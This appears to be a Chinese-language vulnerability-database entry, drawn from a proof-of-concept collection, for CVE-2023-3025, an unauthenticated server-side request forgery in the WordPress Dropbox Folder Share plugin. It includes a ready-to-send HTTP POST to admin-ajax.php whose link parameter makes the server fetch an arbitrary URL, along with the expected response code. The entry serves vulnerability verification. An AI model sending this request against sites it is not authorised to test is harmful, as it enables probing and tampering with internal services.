﻿# WordPress Dropbox Folder Share 服务器端请求伪造漏洞

> 更新时间：2023-12-31

> 漏洞编号：CVE-2023-3025

> 漏洞说明：WordPress Plugin Dropbox Folder Share 1.9.7 及之前版本存在代码问题漏洞，该漏洞源于允许未经身份验证的攻击者通过link参数向 Web 应用程序的任意位置发出 Web 请求，可用于查询和修改来自内部服务的信息。

> 漏洞特征：

> 验证脚本：HTTP

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded

action=getFolderHeaders&link=http://www.baidu.com
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：


> 验证文件来源：WordPress Dropbox Folder Share 服务器端请求伪造漏洞.poc
